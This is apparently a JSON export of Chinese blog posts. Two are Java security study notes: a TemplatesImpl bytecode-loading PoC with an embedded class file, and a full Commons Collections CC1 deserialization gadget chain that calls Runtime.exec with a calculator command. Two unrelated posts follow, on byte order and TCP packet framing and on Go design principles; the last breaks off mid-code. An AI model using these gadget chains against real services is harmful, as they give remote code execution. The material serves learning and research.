[{"id":"211e29fe185e9fd550f614a95fe4e743","title":"TemplatesImpl加载字节码和CC链复现","content":"TemplatesImpl加载字节码漏洞点：因为之前学过，loadClass 使用的双亲委派，意思就是会先查看父类中是否可以加载，如果不能加载就由自己去加载。\nClass defineClass(final byte[] b) &#123;\n    return defineClass(null, b, 0, b.length);\n&#125;\n\n是根据名字来进行查找的，比如java.lang 包下的东西由固定的“解析器”来进行解析。\n构造函数：这里有兴趣的可以看下构造函数， 构造函数全部都非公开，所以这里肯定直接调用是利用不通的，所以只能是通过反射调用。来进行参数的赋值。\n调用栈1:（TemplatesImpl::defineTransletClasses）private void defineTransletClasses()\n      throws TransformerConfigurationException &#123;\n\n      if (_bytecodes == null) &#123;\n          ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);\n          throw new TransformerConfigurationException(err.toString());\n      &#125;\n\n      TransletClassLoader loader = (TransletClassLoader)\n          AccessController.doPrivileged(new PrivilegedAction() &#123;\n              public Object run() &#123;\n                  return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());\n              &#125;\n          &#125;);\n\n      try &#123;\n          final int classCount = _bytecodes.length;\n          _class = new Class[classCount];\n\n          if (classCount > 1) &#123;\n              _auxClasses = new HashMap&lt;>();\n          &#125;\n\n          for (int i = 0; i &lt; classCount; i++) &#123;\n              _class[i] = loader.defineClass(_bytecodes[i]);\n              final Class superClass = _class[i].getSuperclass();\n\n              // Check if this is the main class\n              if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;\n                  _transletIndex = i;\n              &#125;\n              else &#123;\n                  _auxClasses.put(_class[i].getName(), _class[i]);\n              &#125;\n          &#125;\n\n          if (_transletIndex &lt; 0) &#123;\n              ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);\n              throw new TransformerConfigurationException(err.toString());\n          &#125;\n      &#125;\n      catch (ClassFormatError e) &#123;\n          ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);\n          throw new TransformerConfigurationException(err.toString());\n      &#125;\n      catch (LinkageError e) &#123;\n          ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);\n          throw new TransformerConfigurationException(err.toString());\n      &#125;\n  &#125;\n\n这里跟一下满足条件。发现是_bytecodes不能为null，发现_tfactory还得调用getExternalExtensionsMap这个方法，所以这里的条件就是\n_bytecodes!&#x3D;null\n_tfactory&#x3D;new TransformerFactoryImpl();\n\n\n\n调用栈3（TemplatesImpl::getTransletInstance）其实有好几处，为什么找到这里，因为我们知道类加载的时候必须要newinstance或者class.forname进行类初始化才能进行static的加载。\nprivate Translet getTransletInstance()\n        throws TransformerConfigurationException &#123;\n        try &#123;\n            if (_name == null) return null;\n\n            if (_class == null) defineTransletClasses();\n\n            // The translet needs to keep a reference to all its auxiliary\n            // class to prevent the GC from collecting them\n            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();\n            translet.postInitialization();\n            translet.setTemplates(this);\n            translet.setServicesMechnism(_useServicesMechanism);\n            translet.setAllowedProtocols(_accessExternalStylesheet);\n            if (_auxClasses != null) &#123;\n                translet.setAuxiliaryClasses(_auxClasses);\n            &#125;\n\n            return translet;\n        &#125;\n        catch (InstantiationException e) &#123;\n            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);\n            throw new TransformerConfigurationException(err.toString());\n        &#125;\n        catch (IllegalAccessException e) &#123;\n            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);\n            throw new TransformerConfigurationException(err.toString());\n        &#125;\n    &#125;\n\n这里满足的条件\n_class&#x3D;&#x3D;null\n_name!&#x3D;null\n\n\n\n\n\n代码(poc)上面只是草草的讲了一下，因为比较简单，所以就直接上代码。\npackage org.example.template;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\n\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationTargetException;\nimport java.util.HashMap;\n\npublic class Templateimpl &#123;\n    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, TransformerConfigurationException &#123;\n        TemplatesImpl templates = new TemplatesImpl();\n        Class&lt;? extends TemplatesImpl> aClass = templates.getClass();\n        Field name = aClass.getDeclaredField(\"_name\");\n        name.setAccessible(true);\n        name.set(templates, \"1\");\n        Field aClass1 = aClass.getDeclaredField(\"_tfactory\");\n        Field auxClasses = aClass.getDeclaredField(\"_auxClasses\");\n        auxClasses.setAccessible(true);\n        auxClasses.set(templates, new HashMap&lt;Object, Object>());\n        aClass1.setAccessible(true);\n        aClass1.set(templates, new TransformerFactoryImpl());\n        Field bytecodes = aClass.getDeclaredField(\"_bytecodes\");\n        bytecodes.setAccessible(true);\n        bytecodes.set(templates, new byte[][]&#123;new byte[]&#123;-54, -2, -70, -66, 0, 0, 0, 52, 0, 49, 10, 0, 12, 0, 22, 9, 0, 23, 0, 24, 8, 0, 25, 10, 0, 26, 0, 27, 10, 0, 28, 0, 29, 8, 0, 30, 10, 0, 28, 0, 31, 7, 0, 32, 7, 0, 33, 10, 0, 9, 0, 34, 7, 0, 35, 7, 0, 36, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 32, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 8, 99, 109, 100, 46, 106, 97, 118, 97, 12, 0, 13, 0, 14, 7, 0, 37, 12, 0, 38, 0, 39, 1, 0, 2, 49, 49, 7, 0, 40, 12, 0, 41, 0, 42, 7, 0, 43, 12, 0, 44, 0, 45, 1, 0, 18, 111, 112, 101, 110, 32, 45, 97, 32, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 12, 0, 46, 0, 47, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 26, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 13, 0, 48, 1, 0, 15, 111, 114, 103, 47, 101, 120, 97, 109, 112, 108, 101, 47, 99, 109, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 3, 111, 117, 116, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 1, 0, 7, 112, 114, 105, 110, 116, 108, 110, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 59, 41, 86, 0, 33, 0, 11, 0, 12, 0, 0, 0, 0, 0, 2, 0, 1, 0, 13, 0, 14, 0, 1, 0, 15, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 16, 0, 0, 0, 6, 0, 1, 0, 0, 0, 5, 0, 8, 0, 17, 0, 14, 0, 1, 0, 15, 0, 0, 0, 96, 0, 3, 0, 1, 0, 0, 0, 31, -78, 0, 2, 18, 3, -74, 0, 4, -72, 0, 5, 18, 6, -74, 0, 7, 87, -89, 0, 13, 75, -69, 0, 9, 89, 42, -73, 0, 10, -65, -79, 0, 1, 0, 8, 0, 17, 0, 20, 0, 8, 0, 2, 0, 16, 0, 0, 0, 26, 0, 6, 0, 0, 0, 7, 0, 8, 0, 9, 0, 17, 0, 12, 0, 20, 0, 10, 0, 21, 0, 11, 0, 30, 0, 13, 0, 18, 0, 0, 0, 7, 0, 2, 84, 7, 0, 19, 9, 0, 1, 0, 20, 0, 0, 0, 2, 0, 21&#125;&#125;);\n        Field transletIndex = aClass.getDeclaredField(\"_transletIndex\");\n        transletIndex.setAccessible(true);\n        transletIndex.set(templates, 0);\n        templates.newTransformer();\n    &#125;\n&#125;\n\n\n","slug":"TemplatesImpl加载字节码和CC链复现","date":"2023-09-03T13:45:01.000Z","categories_index":"","tags_index":"JAVA安全","author_index":"Q16G"},{"id":"0e8f1603b8315950f63fd25486814bb0","title":"Java的CC1复现","content":"JAVA的CC1是一直复现一直复现反反复复，这里就复现完了就进行记录。\n复现：漏洞点（InvokerTransformer-&gt;transform）public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;\n    super();\n    iMethodName = methodName;\n    iParamTypes = paramTypes;\n    iArgs = args;\n&#125;\n\n\n\npublic Object transform(Object input) &#123;\n    if (input == null) &#123;\n        return null;\n    &#125;\n    try &#123;\n        Class cls = input.getClass();\n        Method method = cls.getMethod(iMethodName, iParamTypes);\n        return method.invoke(input, iArgs);\n            \n    &#125; catch (NoSuchMethodException ex) &#123;\n        throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\");\n    &#125; catch (IllegalAccessException ex) &#123;\n        throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\");\n    &#125; catch (InvocationTargetException ex) &#123;\n        throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex);\n    &#125;\n&#125;\n\n这里的漏洞点在transform中。这里先写一个demo来进行测试。\ncmd cmd = new cmd();\nInvokerTransformer InvokerTransformer = new InvokerTransformer(\"StringA\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"whoami\"&#125;);\nInvokerTransformer.transform(cmd);\n\n接下来我们就需要进行查找，xx.transform的方法，xx可控或者直接调用InvokerTransformer的transform\n调用栈1：（TransformedMap-&gt;checkValue）protected Object checkSetValue(Object value) &#123;\n    return valueTransformer.transform(value);\n&#125;\n\n这里看一下构造方法，调用了父类的构造方法，经过查看发现将当前的map赋值成父类的map。但是这个构造函数是protected的，所以不能直接进行调用，这里寻找调用栈。\nprotected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;\n    super(map);\n    this.keyTransformer = keyTransformer;\n    this.valueTransformer = valueTransformer;\n&#125;\n\n发现有两个类的静态方法进行了调用。\n\nTranformedMap::decorate\nTranformedMap::decorateTransform\n\n因为checksetvalue是protected，所以我们无法直接进行调用，所以我们找，谁调用了checksetvalue。\n调用栈2：AbstractInputCheckedMapDecorator::setValuepublic Object setValue(Object value) &#123;\n    value = parent.checkSetValue(value);\n    return entry.setValue(value);\n&#125;\n\n这里找谁调用setvalue其实会很复杂，所以我们这里就进行分析。关注四个点：\n\n代码追踪点（就是上面的setValue）\n构造函数\n入口点（有些构造函数是private或者protected等一些特殊情况）\n成员变量\n\n内部调用栈1：setValue实现了Map.Entry这里找谁调用了MapEntry的静态内置类\n内部调用栈2：静态内置类（EntrySetIterator::next）这里发现静态内置类的next方法中进行了调用，这里还是关注上面那四个点，这里的构造函数其实就是将传入的值赋值给父类的iterator。所以这里进行迭代的时候还需要看一下父类的HasNext方法。\nprotected EntrySetIterator(Iterator iterator, AbstractInputCheckedMapDecorator parent) &#123;\n    super(iterator);\n    this.parent = parent;\n&#125;\n\npublic Object next() &#123;\n    Map.Entry entry = (Map.Entry) iterator.next();\n    return new MapEntry(entry, parent);\n&#125;\n\n查看一下EntrySetIterator的父类：\npublic class AbstractIteratorDecorator implements Iterator\n\n父类的hasNext方法其实就是判断了传入的map是否有元素。\npublic boolean hasNext() &#123;\n    return iterator.hasNext();\n&#125;\n\n其实就是实现了Iterator接口，这里就可以说明其实就是迭代器，迭代器就关注两个方法，一个hasnext，一个next。 这里细说一下hasNext和Next方法。给出下面的demo\n// 正常我们遍历的时候都会用下面来进行遍历，其实下面遍历的原理是\n\nfor(Map.Entry&lt;Object,Object> entry:entry.set())&#123;&#125;\n\n\n// 其实原理就是这个，先判断是否可以有下一个对象，如果有再进行遍历。\nwhile(迭代器.hasNext())&#123;\n    String a = 迭代器.next();\n    // 处理数据\n&#125;\n\n内部调用栈3：内部调用类EntrySet::iterator方法这里没有什么可以说的，就是一个典型的迭代器写法（后面有我的迭代器demo）\npublic Iterator iterator() &#123;\n    return new EntrySetIterator(collection.iterator(), parent);\n&#125;\n\n内部调用栈4：内部调用类(AbstractInputCheckedMapDecorator::entryset)public Set entrySet() &#123;\n    if (isSetValueChecking()) &#123;\n        return new EntrySet(map.entrySet(), this);\n    &#125; else &#123;\n        return map.entrySet();\n    &#125;\n&#125;\n\n这里就先查看是否有isSetValueChecking（可能会被重写）然后才能进行循环。\n总结内部调用栈2：内部调用栈2其实就是重写了Map方法，以及重新定义了entrySet方法，让entryset方法以迭代器的步骤来进行。\nTip：\n\n迭代器的类实现Iterable接口\n迭代器的iterator 返回的对象实现Iterator接口\n\n调用栈3：AnnotationInvocationHandler::readObject看函数的参数和构造方法\nAnnotationInvocationHandler(Class&lt;? extends Annotation> type, Map&lt;String, Object> memberValues) &#123;\n    Class&lt;?>[] superInterfaces = type.getInterfaces();\n    if (!type.isAnnotation() ||\n        superInterfaces.length != 1 ||\n        superInterfaces[0] != java.lang.annotation.Annotation.class)\n        throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\");\n    this.type = type;\n    this.memberValues = memberValues;\n&#125;\n\n这段代码的意思就是\n\n是一个Annotation\n长度为1\n第一个是Annotation的class\n\n然后进入到赋值\nAnnotationType annotationType = null;\n        try &#123;\n            annotationType = AnnotationType.getInstance(type);\n        &#125; catch(IllegalArgumentException e) &#123;\n            // Class is no longer an annotation type; time to punch out\n            throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");\n        &#125;\n\n        Map&lt;String, Class&lt;?>> memberTypes = annotationType.memberTypes();\n\n        // If there are annotation members without values, that\n        // situation is handled by the invoke method.\n\n这里的type就是上面赋值的annotation的class。\n内部调用栈1：AnnotationType.getInstancepublic static AnnotationType getInstance(\n    Class&lt;? extends Annotation> annotationClass)\n&#123;\n    JavaLangAccess jla = sun.misc.SharedSecrets.getJavaLangAccess();\n    AnnotationType result = jla.getAnnotationType(annotationClass); // volatile read\n    if (result == null) &#123;\n        result = new AnnotationType(annotationClass);\n        // try to CAS the AnnotationType: null -> result\n        if (!jla.casAnnotationType(annotationClass, null, result)) &#123;\n            // somebody was quicker -> read it's result\n            result = jla.getAnnotationType(annotationClass);\n            assert result != null;\n        &#125;\n    &#125;\n\n    return result;\n&#125;\n\n这里的代码重点看第7行，这里将传入的annotationtype进行了new方法的调用\n内部调用栈2：AnnotationType::AnnotationType构造方法private AnnotationType(final Class&lt;? extends Annotation> annotationClass) &#123;\n        if (!annotationClass.isAnnotation())\n            throw new IllegalArgumentException(\"Not an annotation type\");\n\n        Method[] methods =\n            AccessController.doPrivileged(new PrivilegedAction&lt;Method[]>() &#123;\n                public Method[] run() &#123;\n                    // Initialize memberTypes and defaultValues\n                    return annotationClass.getDeclaredMethods();\n                &#125;\n            &#125;);\n\n        memberTypes = new HashMap&lt;String,Class&lt;?>>(methods.length+1, 1.0f);\n        memberDefaults = new HashMap&lt;String, Object>(0);\n        members = new HashMap&lt;String, Method>(methods.length+1, 1.0f);\n\n        for (Method method :  methods) &#123;\n            if (method.getParameterTypes().length != 0)\n                throw new IllegalArgumentException(method + \" has params\");\n            String name = method.getName();\n            Class&lt;?> type = method.getReturnType();\n            memberTypes.put(name, invocationHandlerReturnType(type));\n            members.put(name, method);\n\n            Object defaultValue = method.getDefaultValue();\n            if (defaultValue != null)\n                memberDefaults.put(name, defaultValue);\n        &#125;\n\n这里看一下\n\n第6行：获取到annotation中的所有方法\n第22行：将方法名，方法的返回类型放入到memeberType中\n第23行：members里面放入的是方法名和方法\n\n调用栈3：readObject（440行）–&gt; annotationType.memberTypespublic Map&lt;String, Class&lt;?>> memberTypes() &#123;\n    return memberTypes;\n&#125;\n\nreadObject的遍历for (Map.Entry&lt;String, Object> memberValue : memberValues.entrySet()) &#123;\n    String name = memberValue.getKey();\n    Class&lt;?> memberType = memberTypes.get(name);\n    if (memberType != null) &#123;  // i.e. member still exists\n        Object value = memberValue.getValue();\n        if (!(memberType.isInstance(value) ||\n              value instanceof ExceptionProxy)) &#123;\n            memberValue.setValue(\n                new AnnotationTypeMismatchExceptionProxy(\n                    value.getClass() + \"[\" + value + \"]\").setMember(\n                        annotationType.members().get(name)));\n        &#125;\n    &#125;\n&#125;\n\n这里将membervalue进行遍历，其实就是将我们传入的map进行遍历。\n\n第五行：拿我们传入的map的key值去匹配，，看是否可以获取到value，这里membertypes中传入的是annotation&lt;方法名,返回类型&gt;，所以这里要满足的条件是，传入的map中的key是annotation的方法名\n第6行：进入到if中进行判断，这里判断了annotation的返回值不是对象也不是继承 ExceptionProxy\n而它setvalue的对象是\n\nnew AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name))\n\n这里跟进发现其实就是调用了getname方法，然后返回值。\nclass AnnotationTypeMismatchExceptionProxy extends ExceptionProxy &#123;\n    private static final long serialVersionUID = 7844069490309503934L;\n    private Method member;\n    private String foundType;\n\n    /**\n     * It turns out to be convenient to construct these proxies in\n     * two stages.  Since this is a private implementation class, we\n     * permit ourselves this liberty even though it's normally a very\n     * bad idea.\n     */\n    AnnotationTypeMismatchExceptionProxy(String foundType) &#123;\n        this.foundType = foundType;\n    &#125;\n\n    AnnotationTypeMismatchExceptionProxy setMember(Method member) &#123;\n        this.member = member;\n        return this;\n    &#125;\n\n这里看到返回值，其实返回的就是一个方法，有两种情况\n\n方法返回值为恶意对象（不现实）\n在setvalue的时候，其实调用的是value.transform，这里看了一下作者的代码，发现是利用了value.transform来进行的链式调用。\n\ncmd cmd = new cmd();\nHashMap&lt;Object, Object> objectObjectHashMap = new HashMap&lt;>();\nobjectObjectHashMap.put(\"value\", \"1\");\nInvokerTransformer Invoker = new InvokerTransformer(\"StringA\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"hello world!\"&#125;);\nChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;\n        new ConstantTransformer(cmd),\n        new InvokerTransformer(\"StringA\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"hello world!\"&#125;)\n&#125;);\nClass&lt;?> aClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\nConstructor&lt;?> declaredConstructor = aClass.getDeclaredConstructor(Annotation.class.getClass(), Map.class);\nMap&lt;Object, Object> decorate = TransformedMap.decorate(objectObjectHashMap, null, chainedTransformer);\ndeclaredConstructor.setAccessible(true);\nObject o = declaredConstructor.newInstance(Target.class, decorate);\nMain.Serialize(o);\nMain.UnSerialize();\n\n\n\n\n\nRuntime.class的反序列化问题Runtime不能序列化，但是Class是可以进行序列化的，所以这里咱们就可以从Class原形来进行入手。按照InvocationTransformer那种格式来进行编写。\n\n        Class&lt;? extends Class> aClass = Runtime.class.getClass();\n        Method getMethod = aClass.getMethod(\"getMethod\", String.class, Class[].class);\n        Method getRuntime = (Method) getMethod.invoke(Runtime.class, \"getRuntime\", null);\n//        第二轮\n        Class&lt;? extends Method> a = getRuntime.getClass();\n        Method invoke = a.getMethod(\"invoke\", Object.class, Object[].class);\n        Runtime invoke1 = (Runtime) invoke.invoke(getRuntime, null, null);\n//        第三轮\n        Class&lt;? extends Runtime> aClass1 = invoke1.getClass();\n        Method exec = aClass1.getMethod(\"exec\", String.class);\n        exec.invoke(invoke1, \"open -a Calculator\");\n\n\n\n最后链子public class Main &#123;\n    private static void Serialize(Object obj) throws IOException &#123;\n        FileOutputStream fileOutputStream = new FileOutputStream(\"bin.ser\");\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);\n        objectOutputStream.writeObject(obj);\n        fileOutputStream.close();\n        objectOutputStream.close();\n    &#125;\n\n    private static void UnSerialize() throws IOException, ClassNotFoundException &#123;\n        FileInputStream fileInputStream = new FileInputStream(\"bin.ser\");\n        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);\n        Object o = objectInputStream.readObject();\n        fileInputStream.close();\n        objectInputStream.close();\n    &#125;\n\n\n    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException, IOException &#123;\n        HashMap&lt;Object, Object> objectObjectHashMap = new HashMap&lt;>();\n        objectObjectHashMap.put(\"value\", \"1\");\n        InvokerTransformer Invoker = new InvokerTransformer(\"StringA\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"hello world!\"&#125;);\n        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),\n                new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),\n                new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"open -a Calculator\"&#125;)\n        &#125;);\n        Class&lt;?> aClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor&lt;?> declaredConstructor = aClass.getDeclaredConstructor(Annotation.class.getClass(), Map.class);\n        Map&lt;Object, Object> decorate = TransformedMap.decorate(objectObjectHashMap, null, chainedTransformer);\n        declaredConstructor.setAccessible(true);\n        Object o = declaredConstructor.newInstance(Target.class, decorate);\n        Main.Serialize(o);\n        Main.UnSerialize();\n    &#125;\n&#125;\n\n","slug":"Java的CC1复现","date":"2023-08-30T14:08:47.000Z","categories_index":"","tags_index":"JAVA安全","author_index":"Q16G"},{"id":"67ca9e91ec24db55ca87af66a3ba205d","title":"字节序列问题","content":"字节序的问题上次在内网穿透已经提到，字节序分为大端和小端，由于不同的芯片造成了不同的字节序列，例如X86是小端存储，System&#x2F;370，SPARC是大端存储，ARM是可以配置的。\n引入不同地区和不同地区的人之间是存在方言的，同一地区由于方言相同，就可以完全通信，但是如果要不同地区之间的人进行通信，由于方言不同，导致你听不懂我的，我听不懂你的，就导致了一系列的问题。所以的话，普通话就出现了，普通话的出现就解决了不同地区之间的沟通问题，那么网络字节序列和主机字节序列也是如此。\n网络字节序列和主机字节序列前面的大端和小端都是在说计算机本身，称为主机字节序列，是自己电脑上的问题，如果自己给自己发送，当然没有任何问题，那么如果在网络中进行发送和读取，如果发送方和你的字节序列是不一致的，那么读取到的内容也会出现问题，所以在网络发送过程中，TCP&#x2F;IP规定，必须使用大端序列来进行发送。（也就是计算机和计算机之间说普通话），接受到数据之后，再转换为自己的字节序列来进行存储，完全可以实现通信。但是需要自定义大小端的来进行发送。\ntcp粘包问题造成的原因：tcp是流传输，默认采用nagle算法，合并较小的数据包，再发送。所以数据发送出来的时候就已经是粘包状态。但是接收方并不知道发送方合并数据包，而且数据包在TCP中是没有分界的，所以就导致了粘包问题。\n解决粘包问题：网络编程中的TLV规范TLV是通信协议的一种约束。例如TCP、UDP都是通信协议，但是上述的协议是不可以改变的，但是在处理实际的业务的过程中，我们的端到端通信的数据是不确定的，我们希望自定义通信协议然后到对方进行解析。TLV便是一种用户自定义的通信协议。\n数据的类型Tag（T）\t                     2字节 or 4字节\n数据的长度Length（L）\t                 2字节 or 4字节\n数据的值Value（V）\t                    由length指定\n\n如下图。\n +----+-----+---------+\n|type| len | content |\n+----+---------------+\n| 4  |  4  |   ...   |\n+----+---------------+\n\n字节序列问题双方在自定义协议的时候需要统一数据格式和大小端\n","slug":"字节序列问题","date":"2023-06-19T02:20:29.000Z","categories_index":"","tags_index":"开发","author_index":"Q16G"},{"id":"1208573faa087b8bddb01ba640107299","title":"设计模型","content":"设计模式设计模式主要为提高代码的可读性、提高代码复用程度来进行的。\n23种设计模式设计模式的设计理念这里的设计模式设计理念很多，比如开闭原则、单一职责原则、依赖倒转原则、合成复用原则等。这里基于几个重要的原则来进行详细的说明。\n开闭原则简单来说就是一个功能点的实现不是靠修改代码来实现的，而是靠增加代码来实现的。\n个人理解：\n   简单来说就是设计出来代码之后，如果要增加代码，尽量不修改原来的代码，而是在原来的代码上增加代码\n\n开闭原则理解：假设这里有一个demo，定义了一个Banker类，进行了Save、Transform、Pay的三种方法\ntype Banker struct&#123;&#125;\n\nfunc (b *Banker) Save() &#123;\n\tfmt.Println(\"进行了存款业务\")\n&#125;\nfunc (b *Banker) Transform() &#123;\n\tfmt.Println(\"进行了转账业务\")\n&#125;\nfunc (b *Banker) Pay() &#123;\n\tfmt.Println(\"进行了支付业务\")\n&#125;\n\n如果要给Banker增加一个方法，那么我们应该如何去做呢？？？\n如果在上面的代码中增加一个股票的业务，这里我们可以直接写入\nfunc (b *Banker) Shares() &#123;\n\tfmt.Println(&quot;进行了股票业务&quot;)\n&#125;\n\n这里的业务是较为简单的，如果业务较为复杂，你修改原有的类，就显得较为困难，那么我们应该去正确的编写代码呢？？？？\n这里官方给出的解决方法：\n我们可以把Banker进行抽象，编写一个抽象的Banker，然后进行分类，我们可以继承并且实现抽象的Banker后进行Save方法\n\n有点类似于，Banker进行了细节划分，如下图，细化分为了SaveBanker、PayBanker、TransformBanker\n\n\n官方代码实现如下：/*\n这里定义了一个抽象的Banker接口，定义了DoSomeThing的方法\n*/\ntype AbstractBanker interface &#123;\n\tDoSomeThing()\n&#125;\n/*\n这里实现了抽象Banker接口，并且做了自己的事情\n*/\ntype SaveAbstractBanker struct&#123;&#125;\n\nfunc (SB *SaveAbstractBanker) DoSomeThing() &#123;\n\tfmt.Println(\"Save running....\")\n&#125;\n....\n....\n....\n....\n\n官方代码实现的一些弊端：  开闭原则如果用官方实现的话，我们就会发现一些问题\n（1）如果各个Banker需要做的事情不同（这里指的是Save和Pay）中的方法中的形参不同，就会导致interface接口中定义很多类方法，如果面向抽象接口来进行编程的话，要实现多态就会较为复杂。\n\n\n\n个人想法：我们既然可以用接口来完成，那么我们也可以用“类”来进行完成。我们可以定义一个基类BaseBanker，然后实现基类必须实现的方法，然后去子类去实现基类，自定义方法去实现。\ntype BaseBanker struct &#123;\n\t/*\n\t\t属性1\n\t\t....\n\t*/\n&#125;\nfunc (bb *BaseBanker) Pay() &#123;\n\tfmt.Println(\"进行一个支付业务\")\n&#125;\n/*\n下面的SaveBanker继承了BaseBanker 并且有自己的Save方法\n*/\ntype SaveBanker struct &#123;\n\tBaseBanker\n\t/*\n\t\tSaveBanker自定义的一些属性\n\t*/\n&#125;\nfunc (SB *SaveBanker) Save() &#123;\n\tfmt.Println(\"进行了一个存储业务\")\n&#125;\n\n个人想法的一些缺点和适用情况（1）不符合面向接口编程\n（2）如果类太多，就会导致继承比较复杂\n\n\n适用情况：\n   各个类之间的函数参数不定，如果使用接口实现较为复杂\n\n这里个人还是建议，能面向接口编程，一定要面向接口编程。\n依赖倒转原则编写代码时，要依赖于接口，不要依赖于具体的实现，面向接口编程 给代码分层，接口层，实现层，逻辑层。\n例如，有以下的几种情况。\n（1）张三开宝马，如何编写代码\n（2）李四开奔驰，如何编写代码\n（3）张三开奥迪或者其他车，李四开奥迪或者其他车，又应该如何编写\n\n我们可以去定义两个接口，一个person接口，一个car接口\ntype Car interface &#123;\n\tRun()\n&#125;\ntype Person interface &#123;\n\tDrive(car Car)\n&#125;\n\n之后的话，我们可以实现这两个接口\ntype Zhangsan struct&#123;&#125;\n\nfunc (zs *Zhangsan) Drive(car Car) &#123;\n\tcar.Run()\n&#125;\n\ntype Benchi struct&#123;&#125;\n\nfunc (bc *Benchi) Run() &#123;\n\tfmt.Println(\"奔驰.....\")\n&#125;\n\n然后我们就可以用代码来进行逻辑上的操作。\nfunc main() &#123;\n\tvar a Person = &amp;Zhangsan&#123;&#125;\n\ta.Drive(&amp;Benchi&#123;&#125;)\n&#125;\n\n\n合成复用原则：当我们用继承和组合都可以解决问题的时候，优先使用组合的方式来解决。 （因为：当我们使用继承的方式去解决的时候，如果父类中的某个方法要改变，子类也会受到影响，除非重写父类方法）\n详细说明组合：type catc struct &#123;\n\tcat *cat\n&#125;\n\nfunc (cc *catc) eat() 